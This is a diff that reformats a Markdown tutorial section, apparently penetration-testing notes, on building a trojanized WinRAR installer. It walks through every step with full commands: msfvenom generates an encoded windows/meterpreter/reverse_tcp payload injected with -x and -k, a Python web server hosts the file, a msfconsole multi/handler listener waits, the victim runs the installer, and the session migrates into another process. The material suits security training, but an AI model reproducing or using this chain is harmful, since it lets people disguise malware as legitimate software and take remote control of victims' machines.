@@ -227,56 +227,82 @@
   
 ## Injecting Payloads Into Windows Portable Executables (Demo)
 
-`msfvenom`
+### Using `msfvenom`
 
-### We use the -x option (k and x would also work)
+We will use the `-x` option (the `-k` and `-x` options would also work).
 
-`msfvenom`
+### Objective
 
-We are going to generate a x86 meterpreter payload and inject it into the WinRaR setup file. So we download WinRaR.
+We are going to generate an x86 meterpreter payload and inject it into the WinRAR setup file. First, we download WinRAR.
 
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe`
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
+    ```
 
-We check out if the payload got generated successfully
+### Checking if the Payload was Generated
 
-`cd Desktop/Windows_Payloads/`
+We navigate to the directory where the payload was generated:
 
-`ls`
+    ```bash
+    cd ~/Desktop/Windows_Payloads/
+    ls
+    ```
 
-We can see the payload "winrar.exe"
+We should see the `winrar.exe` payload file.
 
-We set up a web server to host the files in a directory
+### Setting up a Web Server
 
-`sudo python -m SimpleHTTPServer 80`
+To serve the payload, we set up a simple web server:
 
-We set up a Listener (multi handler) on a New Tab
+    ```bash
+    sudo python -m SimpleHTTPServer 80
+    ```
 
-`msfconsole`
+### Setting up a Listener (Multi-Handler)
 
-`use multi/handler`
+In a new tab, we start `msfconsole`:
 
-Set payload that we used to generate our executeable
+    ```bash
+    msfconsole
+    ```
 
-`set payload windwows/meterpreter/reverse_tcp`
+We then configure the multi-handler:
 
-`set LHOST [own IP]`
+    ```bash
+    use multi/handler
+    ```
 
-`set LPORT 1234`
+Next, we set the payload that we used to generate the executable:
 
-`run`
+    ```bash
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST [own IP]
+    set LPORT 1234
+    run
+    ```
 
-On the Windows system, we can execute the payload (winrar setup file). Because we didn't utilized the -k option, it will not start the setup process, instead it just executes the payload.
+### Executing the Payload
 
-On the kali system, we got a meterpreter session.
+On the Windows system, we execute the payload (the WinRAR setup file). Since we did **not** use the `-k` option, it will not start the setup process. Instead, it just executes the payload.
 
-Manages the process that the meterpreter payload is currently running on onto another on (for example, notepad.exe):
+### Result
 
-`run post/windows/migrate`
+On the Kali system, we receive a meterpreter session.
+
+### Process Migration
+
+We migrate the process that the meterpreter payload is currently running on to another process (for example, `notepad.exe`):
+
+    ```bash
+    run post/windows/migrate
+    ```
 
 ![grafik](https://github.com/user-attachments/assets/dbd5d1aa-d2ca-4d62-b740-9baa19f01462)
 
-### -K Option
+## The `-k` Option
 
-- The -k options maintains the functionality of the file we are injecting with a payload. Works not on a lot of executables, though. Requires a lot of testing with different executables.
+The `-k` option maintains the functionality of the file we are injecting with a payload. However, it doesn't work on a lot of executables and requires extensive testing with different programs.
 
-``
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
+    ```
